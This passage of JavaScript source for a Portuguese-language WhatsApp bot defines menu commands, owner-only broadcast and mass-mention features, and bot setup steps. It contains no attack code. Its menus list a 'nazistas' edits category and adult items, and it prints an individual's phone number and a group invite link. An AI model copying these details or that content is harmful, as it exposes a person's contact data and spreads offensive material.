┃▬▬▬▬▬▬▬【☪】▬▬▬▬▬▬▬
┃
┃──────────────────────
┃edits say_cat
┃──────────────────────
┃➥ *${prefix}say1*
┃➥ *${prefix}say2*
┃➥ *${prefix}say3*
┃➥ *${prefix}say4*
┃➥ *${prefix}say5*
┃➥ *${prefix}say6*
┃──────────────────────
┃edits xxxtentacion
┃──────────────────────
┃➥ *${prefix}xxx1*
┃➥ *${prefix}xxx2*
┃──────────────────────
┃edits nazistas
┃──────────────────────
┃➥ em breve ${pushname}️❤️😠
┃
┃ *TERMINAMOS POR AQUI ${pushname}️👋🏼*
┗━───────────────────────────╯
` 
                    client.sendMessage(from, wew, image, { quoted: mek, caption: menuedits })
					break
case 'menumemes':
case 'menumemes':
uptime = process.uptime()
const dyq =['Foge por um instante do homem irado, mas foge sempre do hipócrita.','Deve-se aprender sempre, até mesmo com um inimigo.','Ninguém ignora tudo. Ninguém sabe tudo. Todos nós sabemos alguma coisa. Todos nós ignoramos alguma coisa. Por isso aprendemos sempre.','A gente só morre uma vez. Mas é para sempre.','Assuma o comando da sua atitude. Não deixe que outra pessoa a escolha por você.','Cada segundo é tempo para mudar tudo para sempre.']
const dwq = dyq[Math.floor(Math.random() * dyq.length)]
const dtq =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const dpb = dtq[Math.floor(Math.random() * dtq.length)]

			        menumemes = `
${line23}MENUMEMES${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line43}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${dwq}*	
${line21}${line26}
${line21}	
${line22} *${prefix}meme (br)*
${line22} *${prefix}memeindo (inglês)*
${line22} *${prefix}darkjokes (memes aleatórios)*
${line22} *${prefix}alerta*	      
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(menumemes)
			        break
               case 'menuhd':
uptime = process.uptime()
const lqt =['A esperança é um alimento da nossa alma, ao qual se mistura sempre o veneno do medo.','Algumas pessoas nunca cometem os mesmos erros duas vezes. Descobrem sempre novos erros para cometer.','O passado e o futuro parecem-nos sempre melhores; o presente, sempre pior.','Foi um grande conselho o que ouvi certa vez, dado a um jovem: "Faça sempre o que tiver medo de fazer".','Se você agir sempre com dignidade, talvez não consiga mudar o mundo, mas será um canalha a menos.','Trabalha como se vivesses para sempre. Ama como se fosses morrer hoje.']
const lpy = lqt[Math.floor(Math.random() * lqt.length)]
const luw =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const lxz = luw[Math.floor(Math.random() * luw.length)]
                    wew = fs.readFileSync(`./olaf/hd.jpg`)
                    menuhd = `			
━━━━━━━━━❮MENUHD❯━━━━━━━━━
┏━───────────────────────────╮
┃
┃ *Oir ${pushname}️🍀*
┃
┃ *Bem vindo ao ${line44}*
┃
┃ *Conselho aleatório:*
┃ 
┃ *${lpy}*
┃▬▬▬▬▬▬▬【☪】▬▬▬▬▬▬▬
┃
┃➥ *${prefix}animes* (animes em vídeo)
┃➥ *${prefix}séries* (séries em video)
┃➥ *${prefix}filmes* (filmes pra vcs)
┃➥ *${prefix}família (família sacana)*
┃
┃ *TERMINAMOS POR AQUI ${pushname}️👋🏼*
┗━───────────────────────────╯
` 
                    client.sendMessage(from, wew, image, { quoted: mek, caption: menuhd })
					break
case 'menualeatório':
case 'menualeatório':
uptime = process.uptime()
const fbc =['Foge por um instante do homem irado, mas foge sempre do hipócrita.','Deve-se aprender sempre, até mesmo com um inimigo.','Ninguém ignora tudo. Ninguém sabe tudo. Todos nós sabemos alguma coisa. Todos nós ignoramos alguma coisa. Por isso aprendemos sempre.','A gente só morre uma vez. Mas é para sempre.','Assuma o comando da sua atitude. Não deixe que outra pessoa a escolha por você.','Cada segundo é tempo para mudar tudo para sempre.']
const fgc = fbc[Math.floor(Math.random() * fbc.length)]
const fhc =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const fjc = fhc[Math.floor(Math.random() * fhc.length)]

			        menualeatório = `
${line23}MENUMEMES${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line45}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${fgc}*	
${line21}${line26}
${line21}	
${line22} *${prefix}saycat [aleatório]*
${line22} *${prefix}cachorro [aleatório]*
${line22} *${prefix}gatos [aleatório]*
${line22} *${prefix}olafofc*
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(menualeatório)
			        break
               case 'menumsc':
uptime = process.uptime()
const pbz =['A esperança é um alimento da nossa alma, ao qual se mistura sempre o veneno do medo.','Algumas pessoas nunca cometem os mesmos erros duas vezes. Descobrem sempre novos erros para cometer.','O passado e o futuro parecem-nos sempre melhores; o presente, sempre pior.','Foi um grande conselho o que ouvi certa vez, dado a um jovem: "Faça sempre o que tiver medo de fazer".','Se você agir sempre com dignidade, talvez não consiga mudar o mundo, mas será um canalha a menos.','Trabalha como se vivesses para sempre. Ama como se fosses morrer hoje.']
const pxj = pbz[Math.floor(Math.random() * pbz.length)]
const piy =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const prt = piy[Math.floor(Math.random() * piy.length)]
                    wew = fs.readFileSync(`./olaf/msc.jpg`)
                    menumsc = `			
━━━━━━━━━❮MENUMSC❯━━━━━━━━━
┏━───────────────────────────╮
┃
┃ *Oir ${pushname}️🍀*
┃
┃ *Bem vindo ao ${line46}*
┃
┃ *Conselho aleatório:*
┃ 
┃ *${pxj}*
┃▬▬▬▬▬▬▬【☪】▬▬▬▬▬▬▬
┃
┃➥ *${prefix}hylander*
┃➥ *${prefix}nikeb*
┃➥ *${prefix}BanhoDeLeite*
┃➥ *${prefix}AkDoFlamengo*
┃➥ *${prefix}Nemo*
┃➥ *${prefix}kalidade*
┃➥ *${prefix}macaverde*
┃➥ *${prefix}m4*
┃➥ *${prefix}cmgremio*
┃➥ *${prefix}cmflamengo*
┃➥ *${prefix}kong*
┃➥ *${prefix}suiton*
┃
┃ *TERMINAMOS POR AQUI ${pushname}️👋🏼*
┗━───────────────────────────╯
` 
                    client.sendMessage(from, wew, image, { quoted: mek, caption: menumsc })
					break
               case 'help1':
uptime = process.uptime()
const kpq =['A esperança é um alimento da nossa alma, ao qual se mistura sempre o veneno do medo.','Algumas pessoas nunca cometem os mesmos erros duas vezes. Descobrem sempre novos erros para cometer.','O passado e o futuro parecem-nos sempre melhores; o presente, sempre pior.','Foi um grande conselho o que ouvi certa vez, dado a um jovem: "Faça sempre o que tiver medo de fazer".','Se você agir sempre com dignidade, talvez não consiga mudar o mundo, mas será um canalha a menos.','Trabalha como se vivesses para sempre. Ama como se fosses morrer hoje.']
const kaca = kpq[Math.floor(Math.random() * kpq.length)]
const kobo =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const kjia = kobo[Math.floor(Math.random() * kobo.length)]
                    wew = fs.readFileSync(`./olaf/logo.jpg`)
                    help1 = `			
━━━━━━━━━❮HELP❯━━━━━━━━━
┏━───────────────────────────╮
┃
┃ *Oir ${pushname}️🍀*
┃
┃ *Bem vindo ao ${line47}*
┃
┃ *Conselho aleatório:*
┃ 
┃ *${kaca}*
┃   
┃➥ *PREFIX ｢${prefix}｣*
┃   
┃ *𝐃𝐎𝐍𝐎: ${nomd}*
┃ *𝐒𝐓𝐀𝐓𝐔𝐒: ON*
┃ *𝓒𝓞𝓝𝓣𝓐𝓣𝓞: _wa.me/+5577991174304_*
┃ *𝐂Ó𝐃𝐈𝐆𝐎 𝐊𝐖𝐀𝐈:Kwai223676707*
┃▬▬▬▬▬▬▬【☪】▬▬▬▬▬▬▬
┃
┃➥ *${prefix}figmenu*
┃➥ *${prefix}menugp*
┃➥ *${prefix}diversãomenu*
┃➥ *${prefix}menuanimes*
┃➥ *${prefix}menupremium*
┃➥ *${prefix}menuativar*
┃➥ *${prefix}menudownloads*
┃➥ *${prefix}menulogos*
┃➥ *${prefix}menuvoicemod*
┃➥ *${prefix}menu18*
┃➥ *${prefix}menudono*
┃➥ *${prefix}menuhacker*
┃➥ *${prefix}menuedits*
┃➥ *${prefix}menuprefix*
┃➥ *${prefix}menuvoz*
┃➥ *${prefix}menualeatório*
┃➥ *${prefix}menuhd*
┃➥ *${prefix}menumemes*
┃➥ *${prefix}menumsc*
┃
┃            █║▌│║▌║▌│█│▌║│█║█║│▌║│█║▌
┃
┃                *¹²³ ³² ²³¹ ¹ ¹²³² ³²¹ ³² ¹²³²¹ ³²³*
┃
┃ *TERMINAMOS POR AQUI ${pushname}️👋🏼*
┗━───────────────────────────╯
` 
                    client.sendMessage(from, wew, image, { quoted: mek, caption: help1 })
					break
              case 'dono':
uptime = process.uptime()
const pint =['feito por aleh','os script são indonésio','dono aleh','obh por usar o bot','o script deixarei pra vcs edita etc','não gostou do bot?pq usa então','coração do olaf']
const puht = pint[Math.floor(Math.random() * pint.length)]
const pkjg =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const pqrh = pkjg[Math.floor(Math.random() * pkjg.length)]
                    wew = fs.readFileSync(`./olaf/dono.jpg`)
                    dono = `			
━━━━━━━━━❮DONO❯━━━━━━━━━
┏━───────────────────────────╮
┃
┃ *𝐎𝐢𝐫 ${pushname}️🍀*
┃
┃ *𝐀𝐕𝐈𝐒𝐎:*
┃ 
┃ *${puht}*
┃   
┃ *𝐃𝐎𝐍𝐎: ${nomd}*
┃ *𝐂𝐎𝐍𝐓𝐀𝐓𝐎: _wa.me/+5577991174304_*
┃ *𝐂Ó𝐃𝐈𝐆𝐎 𝐊𝐖𝐀𝐈: 𝐊𝐰𝐚𝐢𝟐𝟐𝟑𝟔𝟕𝟔𝟕𝟎𝟕*
┃ *𝐘𝐎𝐔𝐓𝐔𝐁𝐄: 𝐓𝐎 𝐒𝐄𝐌*
┃ *𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌: 𝐓𝐎 𝐒𝐄𝐌 𝐏𝐎𝐑 𝐄𝐍𝐐𝐔𝐀𝐍𝐓𝐎*
┃ *𝐆𝐏 𝐃𝐎 𝐎𝐋𝐀𝐅: _https://chat.whatsapp.com/KK1WEPVYWs7By5IE5Q60WQ_*
┃
┃ *𝐎𝐒 𝐒𝐂𝐑𝐈𝐏𝐓𝐒 𝐒Ã𝐎 𝐈𝐍𝐃𝐎𝐍É𝐒𝐈𝐎 𝐍𝐄𝐍𝐇𝐔𝐌 𝐁𝐑 𝐅𝐀𝐙 𝐕𝐎𝐔 𝐃𝐄𝐈𝐗𝐀 𝐎 𝐒𝐂𝐑𝐈𝐏𝐓 𝐃𝐄𝐒𝐒𝐄 𝐁𝐎𝐓 𝐏𝐑𝐀 𝐕𝐂𝐒*
┃ *𝐀𝐋𝐆𝐔𝐍𝐒 𝐂𝐎𝐌𝐀𝐍𝐃𝐎𝐒 𝐅𝐎𝐈 𝐀𝐃𝐃 𝐏𝐎𝐑 𝐌𝐈𝐌 𝐄 𝐀𝐋𝐆𝐔𝐌𝐀𝐒 𝐀𝐏𝐈𝐒 𝐃𝐄 𝐎𝐔𝐓𝐑𝐎𝐒 𝐁𝐎𝐓*
┃▬▬▬▬▬▬▬【☪】▬▬▬▬▬▬▬
┃
┗━───────────────────────────╯
` 
                    client.sendMessage(from, wew, image, { quoted: mek, caption: dono })
					break
              case 'fazerbot':
uptime = process.uptime()
const aleh =['ai estão os comandos pra cria um bot']
const foda = aleh[Math.floor(Math.random() * aleh.length)]
const fdm =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const gato = fdm[Math.floor(Math.random() * fdm.length)]
                    wew = fs.readFileSync(`./olaf/fazer.jpg`)
                    fazerbot = `			
━━━━━━━━━❮CRIA BOT❯━━━━━━━━━
┏━───────────────────────────╮
┃
┃ *𝐎𝐢𝐫 ${pushname}️🍀*
┃
┃ *𝐂𝐑𝐈𝐀 𝐁𝐎𝐓*
┃
┃ *${foda}*
┃
┃➥ *${prefix}vídeoaula*
┃
┃➥ *${prefix}vídeoaula1*
┃
┃➥ *${prefix}vídeoaula2*
┃
┃➥ *${prefix}pastascript*
┃
┃➥ *𝐒𝐂𝐑𝐈𝐏𝐓 𝐏𝐑𝐀 𝐈𝐍𝐈𝐂𝐈𝐀 𝐎 𝐁𝐎𝐓*
┃
┃➥ *termux-setup-storage*
┃
┃➥ *cd /sdcard*
┃
┃➥ *cp -r olaf $HOME*
┃
┃➥ *cd olaf && bash install.sh -y && cd && cd olaf && bash install.sh -y*
┃
┃➥ *npm start*
┃
┃➥ *npm i -g pm2*
┃
┃➥ *pm2 start index.js*
┃
┃➥ *pm2 monit*
┃
┃ *FEITO POR ALEH*
┃▬▬▬▬▬▬▬【☪】▬▬▬▬▬▬▬
┃
┗━───────────────────────────╯
` 
                    client.sendMessage(from, wew, image, { quoted: mek, caption: fazerbot })
                    break
              case 'vídeoaula':
uptime = process.uptime()
const kaka =['ai estão os comandos pra cria um bot']
const koko = kaka[Math.floor(Math.random() * kaka.length)]
const khkh =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const kjkj = khkh[Math.floor(Math.random() * khkh.length)]
                    wew = fs.readFileSync(`./olaf/canal.jpg`)
                    vídeoaula = `			
━━━━━━━━━❮VIDEO AULA❯━━━━━━━━━
┏━───────────────────────────╮
┃
┃ *𝐎𝐢𝐫 ${pushname}️🍀*
┃
┃ *𝐂𝐑𝐈𝐀 𝐁𝐎𝐓*
┃
┃ *${koko}*
┃
┃ *⤵️𝐕Í𝐃𝐄𝐎 𝐀𝐁𝐀𝐈𝐗𝐎 𝐏𝐑𝐀 𝐅𝐀𝐙𝐄𝐑 𝐁𝐎𝐓⤵️*
┃
┃➥ 𝐋𝐈𝐍𝐊: https://youtu.be/OHXC64Nuvzc
┃
┃▬▬▬▬▬▬▬【☪】▬▬▬▬▬▬▬
┃
┗━───────────────────────────╯
` 
                    client.sendMessage(from, wew, image, { quoted: mek, caption: vídeoaula })
                    break   
              case 'vídeoaula1':
uptime = process.uptime()
const huhu =['ai estão os comandos pra cria um bot']
const hyhy = huhu[Math.floor(Math.random() * huhu.length)]
const htht =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const hwhw = htht[Math.floor(Math.random() * htht.length)]
                    wew = fs.readFileSync(`./olaf/canal.jpg`)
                    vídeoaula1 = `			
━━━━━━━━━❮VIDEO AULA1❯━━━━━━━━━
┏━───────────────────────────╮
┃
┃ *𝐎𝐢𝐫 ${pushname}️🍀*
┃
┃ *𝐂𝐑𝐈𝐀 𝐁𝐎𝐓*
┃
┃ *${hyhy}*
┃
┃ *⤵️𝐕Í𝐃𝐄𝐎 𝐀𝐁𝐀𝐈𝐗𝐎 𝐏𝐑𝐀 𝐅𝐀𝐙𝐄𝐑 𝐁𝐎𝐓⤵️*
┃
┃➥ 𝐋𝐈𝐍𝐊: https://youtu.be/YMlf8CTkMRc
┃
┃▬▬▬▬▬▬▬【☪】▬▬▬▬▬▬▬
┃
┗━───────────────────────────╯
` 
                    client.sendMessage(from, wew, image, { quoted: mek, caption: vídeoaula1 })
                    break
             case 'vídeoaula2':
uptime = process.uptime()
const suty =['ai estão os comandos pra cria um bot']
const shtu = suty[Math.floor(Math.random() * suty.length)]
const sgty =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const sgte = sgty[Math.floor(Math.random() * sgty.length)]
                    wew = fs.readFileSync(`./olaf/canal.jpg`)
                    vídeoaula2 = `			
━━━━━━━━━❮VIDEO AULA2❯━━━━━━━━━
┏━───────────────────────────╮
┃
┃ *𝐎𝐢𝐫 ${pushname}️🍀*
┃
┃ *𝐂𝐑𝐈𝐀 𝐁𝐎𝐓*
┃
┃ *${shtu}*
┃
┃ *⤵️𝐕Í𝐃𝐄𝐎 𝐀𝐁𝐀𝐈𝐗𝐎 𝐏𝐑𝐀 𝐅𝐀𝐙𝐄𝐑 𝐁𝐎𝐓⤵️*
┃
┃➥ 𝐋𝐈𝐍𝐊: https://youtu.be/MYgpgImAukI
┃
┃▬▬▬▬▬▬▬【☪】▬▬▬▬▬▬▬
┃
┗━───────────────────────────╯
` 
                    client.sendMessage(from, wew, image, { quoted: mek, caption: vídeoaula2 })
                    break                                                                
					case 'hidetag2':
					if (!isGroup) return reply(mess.only.group)
					if (!isadminbot) return reply('Quem é Você?')
					var value = body.slice(9)
					var group = await client.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					client.sendMessage(from, options, text)
					break
					//
				case 'setpp3':
                    if (!isGroup) return reply(mess.only.group)
                    if (!isfrendsowner) return reply('Quem é Você?')
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                    media = await client.downloadAndSaveMediaMessage(mek)
                    await client.updateProfilePicture (from, media)
                    reply('Alterado com sucesso o ícone do Grupo')
                    break
                case 'bc3':
					if (!isfrendsowner) return reply('Kamu siapa?')
					if (args.length < 1) return reply('.......')
					anu = await client.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await client.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							client.sendMessage(_.jid, buff, image, {caption: `[ admin bot Broadcast ]\n\n${body.slice(4)}`})
						}
						reply('Transmissão enviada')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `[ *TRANSMISSÃO* ]\n\n${body.slice(4)}`)
						}
						reply('Transmissão enviada')
					}
					break
				case 'wait':
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						reply(mess.wait)
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						media = await client.downloadMediaMessage(encmedia)
						await wait(media).then(res => {
							client.sendMessage(from, res.video, video, {quoted: mek, caption: res.teks.trim()})
						}).catch(err => {
							reply(err)
						})
					} else {
						reply('Só uma foto mano')
					}
					break
				default:
					if (isGroup && isSimi && budy != undefined) {
						console.log(budy)
						muehe = await simih(budy)
						console.log(muehe)
						reply(muehe)
					} else {
						console.log(color('[ERROR]','red'), 'Unregistered Command from', color(sender.split('@')[0]))
					}
                           }
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
}
starts()
